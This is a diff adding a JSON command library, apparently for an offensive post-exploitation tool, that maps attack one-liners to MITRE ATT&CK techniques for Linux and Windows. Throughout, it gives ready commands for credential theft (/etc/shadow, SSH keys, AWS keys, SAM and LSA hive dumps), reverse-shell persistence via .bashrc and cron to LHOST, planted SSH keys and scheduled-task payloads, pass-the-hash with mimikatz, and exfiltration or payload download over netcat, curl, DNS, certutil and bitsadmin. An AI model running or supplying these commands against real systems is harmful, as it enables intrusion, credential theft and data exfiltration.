@@ -1,0 +1,438 @@
+{
+  "categories": [
+    {
+      "id": "discovery",
+      "label": "Discovery & Enumeration",
+      "platforms": ["linux", "windows"],
+      "commands": [
+        {
+          "id": "linux_whoami",
+          "platform": "linux",
+          "label": "Current user & groups",
+          "cmd": "id && whoami && groups",
+          "mitre": "T1033",
+          "notes": "Identify current user context and group memberships"
+        },
+        {
+          "id": "linux_hostname",
+          "platform": "linux",
+          "label": "Hostname & network info",
+          "cmd": "hostname -f && ip addr && ip route",
+          "mitre": "T1016",
+          "notes": "Full hostname, all interfaces, routing table"
+        },
+        {
+          "id": "linux_os_version",
+          "platform": "linux",
+          "label": "OS & kernel version",
+          "cmd": "uname -a && cat /etc/os-release",
+          "mitre": "T1082",
+          "notes": "Kernel version for priv-esc research, distro identification"
+        },
+        {
+          "id": "linux_users",
+          "platform": "linux",
+          "label": "Local users",
+          "cmd": "cat /etc/passwd | grep -v nologin | grep -v false",
+          "mitre": "T1087.001",
+          "notes": "Users with valid shells"
+        },
+        {
+          "id": "linux_sudo",
+          "platform": "linux",
+          "label": "Sudo privileges",
+          "cmd": "sudo -l 2>/dev/null",
+          "mitre": "T1548.003",
+          "notes": "Commands runnable via sudo — key priv-esc vector"
+        },
+        {
+          "id": "linux_suid",
+          "platform": "linux",
+          "label": "SUID/SGID binaries",
+          "cmd": "find / -perm -4000 -o -perm -2000 2>/dev/null | grep -v proc",
+          "mitre": "T1548.001",
+          "notes": "Unusual SUID binaries are common priv-esc paths; check GTFOBins"
+        },
+        {
+          "id": "linux_cron",
+          "platform": "linux",
+          "label": "Cron jobs (all users)",
+          "cmd": "for u in $(cut -d: -f1 /etc/passwd); do crontab -u $u -l 2>/dev/null | grep -v '^#' | sed \"s/^/$u: /\"; done; ls -la /etc/cron*",
+          "mitre": "T1053.003",
+          "notes": "Writable cron scripts are reliable persistence / priv-esc vectors"
+        },
+        {
+          "id": "linux_processes",
+          "platform": "linux",
+          "label": "Running processes (with paths)",
+          "cmd": "ps auxww",
+          "mitre": "T1057",
+          "notes": "Full process list with command-line arguments"
+        },
+        {
+          "id": "linux_network_connections",
+          "platform": "linux",
+          "label": "Network connections",
+          "cmd": "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null",
+          "mitre": "T1049",
+          "notes": "Listening ports and established connections with PIDs"
+        },
+        {
+          "id": "linux_internal_hosts",
+          "platform": "linux",
+          "label": "Internal host discovery (ARP)",
+          "cmd": "arp -a 2>/dev/null; ip neigh 2>/dev/null",
+          "mitre": "T1018",
+          "notes": "Hosts in ARP cache — previously contacted neighbors"
+        },
+        {
+          "id": "linux_env",
+          "platform": "linux",
+          "label": "Environment variables",
+          "cmd": "env | grep -Ei 'pass|secret|key|token|aws|azure|gcp|api'",
+          "mitre": "T1552.007",
+          "notes": "Credentials and secrets leaking via environment"
+        },
+        {
+          "id": "linux_history",
+          "platform": "linux",
+          "label": "Shell history",
+          "cmd": "cat ~/.bash_history 2>/dev/null; cat ~/.zsh_history 2>/dev/null",
+          "mitre": "T1552.003",
+          "notes": "Commands run by the current user — often reveals credentials and host names"
+        },
+        {
+          "id": "windows_whoami",
+          "platform": "windows",
+          "label": "Current user & privileges",
+          "cmd": "whoami /all",
+          "mitre": "T1033",
+          "notes": "User, group membership, and Windows privilege tokens"
+        },
+        {
+          "id": "windows_hostname",
+          "platform": "windows",
+          "label": "Hostname & network info",
+          "cmd": "hostname & ipconfig /all",
+          "mitre": "T1016",
+          "notes": "FQDN, all adapters, DNS servers"
+        },
+        {
+          "id": "windows_domain",
+          "platform": "windows",
+          "label": "Domain & DC info",
+          "cmd": "net config workstation & nltest /dsgetdc:%USERDOMAIN% 2>nul",
+          "mitre": "T1016",
+          "notes": "Domain name and domain controller address"
+        },
+        {
+          "id": "windows_local_admins",
+          "platform": "windows",
+          "label": "Local administrators",
+          "cmd": "net localgroup administrators",
+          "mitre": "T1087.001",
+          "notes": "Members of the local Administrators group"
+        },
+        {
+          "id": "windows_processes",
+          "platform": "windows",
+          "label": "Running processes",
+          "cmd": "tasklist /v",
+          "mitre": "T1057",
+          "notes": "Verbose process list including user context"
+        },
+        {
+          "id": "windows_network_connections",
+          "platform": "windows",
+          "label": "Network connections",
+          "cmd": "netstat -ano",
+          "mitre": "T1049",
+          "notes": "Active connections and listening ports with PID"
+        },
+        {
+          "id": "windows_arp",
+          "platform": "windows",
+          "label": "ARP cache",
+          "cmd": "arp -a",
+          "mitre": "T1018",
+          "notes": "Recently communicated hosts"
+        },
+        {
+          "id": "windows_shares",
+          "platform": "windows",
+          "label": "Local shares",
+          "cmd": "net share",
+          "mitre": "T1135",
+          "notes": "SMB shares hosted on the local machine"
+        }
+      ]
+    },
+    {
+      "id": "credentials",
+      "label": "Credential Access",
+      "platforms": ["linux", "windows"],
+      "commands": [
+        {
+          "id": "linux_shadow",
+          "platform": "linux",
+          "label": "Read /etc/shadow (root needed)",
+          "cmd": "cat /etc/shadow 2>/dev/null",
+          "mitre": "T1003.008",
+          "notes": "Hashed passwords — crack offline with hashcat -m 1800 (sha512crypt)"
+        },
+        {
+          "id": "linux_ssh_keys",
+          "platform": "linux",
+          "label": "SSH private keys",
+          "cmd": "find /home /root /etc -name 'id_*' -not -name '*.pub' 2>/dev/null",
+          "mitre": "T1552.004",
+          "notes": "Unprotected SSH private keys for lateral movement"
+        },
+        {
+          "id": "linux_credentials_files",
+          "platform": "linux",
+          "label": "Credential files (config, .env, etc.)",
+          "cmd": "find / -maxdepth 5 -name '*.env' -o -name 'config.yml' -o -name 'settings.py' -o -name 'wp-config.php' 2>/dev/null | xargs grep -l -i 'pass\\|secret\\|key' 2>/dev/null | head -20",
+          "mitre": "T1552.001",
+          "notes": "Application config files frequently contain DB passwords and API keys"
+        },
+        {
+          "id": "linux_aws_creds",
+          "platform": "linux",
+          "label": "AWS credentials",
+          "cmd": "cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null; env | grep AWS",
+          "mitre": "T1552.001",
+          "notes": "Static AWS keys stored locally"
+        },
+        {
+          "id": "windows_sam_copy",
+          "platform": "windows",
+          "label": "SAM + SYSTEM hive export (admin)",
+          "cmd": "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv & reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv",
+          "mitre": "T1003.002",
+          "notes": "Export SAM and SYSTEM for offline extraction with secretsdump"
+        },
+        {
+          "id": "windows_lsa_secrets",
+          "platform": "windows",
+          "label": "LSA secrets dump (requires admin + secretsdump)",
+          "cmd": "reg save HKLM\\SECURITY C:\\Windows\\Temp\\sec.hiv",
+          "mitre": "T1003.004",
+          "notes": "SECURITY hive contains LSA secrets and cached domain credentials"
+        },
+        {
+          "id": "windows_wifi_passwords",
+          "platform": "windows",
+          "label": "Saved Wi-Fi passwords",
+          "cmd": "for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| findstr :') do @echo Profile: %a & netsh wlan show profile \"%a\" key=clear | findstr \"Key Content\"",
+          "mitre": "T1552.001",
+          "notes": "Plaintext Wi-Fi passwords from Windows credential manager"
+        },
+        {
+          "id": "windows_cmdkey",
+          "platform": "windows",
+          "label": "Stored credentials (Windows Credential Manager)",
+          "cmd": "cmdkey /list",
+          "mitre": "T1555.004",
+          "notes": "Cached logons for servers and web sites"
+        }
+      ]
+    },
+    {
+      "id": "persistence",
+      "label": "Persistence",
+      "platforms": ["linux", "windows"],
+      "commands": [
+        {
+          "id": "linux_bashrc",
+          "platform": "linux",
+          "label": "Backdoor ~/.bashrc",
+          "cmd": "echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1 &' >> ~/.bashrc",
+          "mitre": "T1546.004",
+          "notes": "Runs reverse shell on next login — survives reboots; replace LHOST/LPORT"
+        },
+        {
+          "id": "linux_cron_persist",
+          "platform": "linux",
+          "label": "Cron persistence (user-level)",
+          "cmd": "(crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1') | crontab -",
+          "mitre": "T1053.003",
+          "notes": "Every-minute reverse shell via cron; replace LHOST/LPORT"
+        },
+        {
+          "id": "linux_ssh_authorized_keys",
+          "platform": "linux",
+          "label": "Add SSH authorized key",
+          "cmd": "mkdir -p ~/.ssh && echo 'SSH_PUBLIC_KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
+          "mitre": "T1098.004",
+          "notes": "Persistent SSH access; replace SSH_PUBLIC_KEY with attacker's pubkey"
+        },
+        {
+          "id": "windows_registry_run",
+          "platform": "windows",
+          "label": "Registry Run key persistence",
+          "cmd": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:\\Windows\\Temp\\payload.exe\" /f",
+          "mitre": "T1547.001",
+          "notes": "Runs payload on each user login; HKLM version requires admin"
+        },
+        {
+          "id": "windows_schtask",
+          "platform": "windows",
+          "label": "Scheduled task persistence",
+          "cmd": "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Windows\\Temp\\payload.exe\" /sc onlogon /ru System /f",
+          "mitre": "T1053.005",
+          "notes": "Scheduled task running as SYSTEM on logon"
+        }
+      ]
+    },
+    {
+      "id": "lateral_movement",
+      "label": "Lateral Movement",
+      "platforms": ["linux", "windows"],
+      "commands": [
+        {
+          "id": "linux_ssh_lateral",
+          "platform": "linux",
+          "label": "SSH lateral with harvested key",
+          "cmd": "ssh -i /path/to/id_rsa -o StrictHostKeyChecking=no user@TARGET",
+          "mitre": "T1021.004",
+          "notes": "Use harvested SSH key to pivot; replace TARGET and user"
+        },
+        {
+          "id": "linux_subnet_sweep",
+          "platform": "linux",
+          "label": "Fast subnet sweep (no nmap)",
+          "cmd": "for i in $(seq 1 254); do (ping -c1 -W1 10.0.0.$i &>/dev/null && echo 10.0.0.$i) & done; wait",
+          "mitre": "T1018",
+          "notes": "ICMP sweep of /24 using bash + ping — no tools required"
+        },
+        {
+          "id": "windows_psexec",
+          "platform": "windows",
+          "label": "PsExec lateral (requires admin creds)",
+          "cmd": "psexec.exe \\\\TARGET -u DOMAIN\\user -p PASSWORD cmd.exe",
+          "mitre": "T1021.002",
+          "notes": "Remote shell via SMB admin share; generates Windows event 7045"
+        },
+        {
+          "id": "windows_wmi_exec",
+          "platform": "windows",
+          "label": "WMI remote execution",
+          "cmd": "wmic /node:TARGET /user:DOMAIN\\user /password:PASSWORD process call create \"cmd.exe /c whoami > C:\\result.txt\"",
+          "mitre": "T1047",
+          "notes": "Remote code execution via WMI — lower noise than PsExec"
+        },
+        {
+          "id": "windows_pass_hash",
+          "platform": "windows",
+          "label": "Pass-the-Hash via mimikatz",
+          "cmd": "mimikatz.exe \"sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTLM_HASH /run:cmd.exe\"",
+          "mitre": "T1550.002",
+          "notes": "Authenticate using NTLM hash without cracking; requires local admin"
+        }
+      ]
+    },
+    {
+      "id": "exfiltration",
+      "label": "Exfiltration",
+      "platforms": ["linux", "windows"],
+      "commands": [
+        {
+          "id": "linux_nc_exfil",
+          "platform": "linux",
+          "label": "Exfiltrate file via netcat",
+          "cmd": "# Receiver: nc -lvp 9001 > loot.tar.gz\ntar czf - /path/to/data | nc LHOST 9001",
+          "mitre": "T1048.003",
+          "notes": "Compress and stream data over raw TCP; no encryption"
+        },
+        {
+          "id": "linux_curl_exfil",
+          "platform": "linux",
+          "label": "Exfiltrate via curl (HTTP POST)",
+          "cmd": "curl -s -X POST -F 'file=@/etc/shadow' http://LHOST:8080/upload",
+          "mitre": "T1048.002",
+          "notes": "Use your Seraph listener or a simple python http.server to receive"
+        },
+        {
+          "id": "linux_dns_exfil",
+          "platform": "linux",
+          "label": "DNS exfiltration (one-liner)",
+          "cmd": "cat /etc/passwd | base64 | while read l; do dig $l.exfil.YOURDOMAIN @LHOST; done",
+          "mitre": "T1048.001",
+          "notes": "Slow but bypasses egress filters; use with a DNS server under your control"
+        },
+        {
+          "id": "windows_certutil_exfil",
+          "platform": "windows",
+          "label": "Download file via certutil (LOLBAS)",
+          "cmd": "certutil.exe -urlcache -split -f http://LHOST/payload.exe C:\\Windows\\Temp\\payload.exe",
+          "mitre": "T1105",
+          "notes": "Living-off-the-land file download; often allowed by application whitelisting"
+        },
+        {
+          "id": "windows_bitsadmin",
+          "platform": "windows",
+          "label": "Download via BITSAdmin (LOLBAS)",
+          "cmd": "bitsadmin /transfer job /download /priority normal http://LHOST/payload.exe C:\\Windows\\Temp\\payload.exe",
+          "mitre": "T1197",
+          "notes": "BITS jobs survive reboots and run in background — often not blocked"
+        }
+      ]
+    },
+    {
+      "id": "privesc",
+      "label": "Privilege Escalation",
+      "platforms": ["linux", "windows"],
+      "commands": [
+        {
+          "id": "linux_writable_service",
+          "platform": "linux",
+          "label": "Find writable service scripts",
+          "cmd": "find /etc/init.d /etc/rc.local /etc/systemd/system -writable 2>/dev/null",
+          "mitre": "T1574.006",
+          "notes": "Write to service scripts for root execution on next service start/reboot"
+        },
+        {
+          "id": "linux_capabilities",
+          "platform": "linux",
+          "label": "Linux capabilities on binaries",
+          "cmd": "getcap -r / 2>/dev/null",
+          "mitre": "T1548.001",
+          "notes": "Binaries with cap_setuid or cap_net_raw are priv-esc candidates; check GTFOBins"
+        },
+        {
+          "id": "linux_writable_path",
+          "platform": "linux",
+          "label": "Writable directories in PATH",
+          "cmd": "echo $PATH | tr ':' '\\n' | xargs -I{} find {} -writable -maxdepth 0 2>/dev/null",
+          "mitre": "T1574.007",
+          "notes": "PATH hijacking — place a binary earlier in PATH to intercept calls"
+        },
+        {
+          "id": "windows_alwaysinstallelevated",
+          "platform": "windows",
+          "label": "AlwaysInstallElevated check",
+          "cmd": "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+          "mitre": "T1548.002",
+          "notes": "If both keys = 1, MSI files run as SYSTEM — trivial priv-esc"
+        },
+        {
+          "id": "windows_unquoted_services",
+          "platform": "windows",
+          "label": "Unquoted service paths",
+          "cmd": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\\\"\"",
+          "mitre": "T1574.009",
+          "notes": "Plant binary in unquoted path to execute as SYSTEM on service start"
+        },
+        {
+          "id": "windows_weak_service_perms",
+          "platform": "windows",
+          "label": "Weak service binary permissions",
+          "cmd": "for /f \"tokens=2 delims='='\" %a in ('wmic service list full ^| find /i \"PathName\" ^| find /i /v \"svchost\"') do @cmd /c icacls \"%a\" 2>nul | findstr /i \"(F) (M) (W) :\"",
+          "mitre": "T1574.010",
+          "notes": "Services with writable binaries can be replaced for SYSTEM execution"
+        }
+      ]
+    }
+  ]
+}
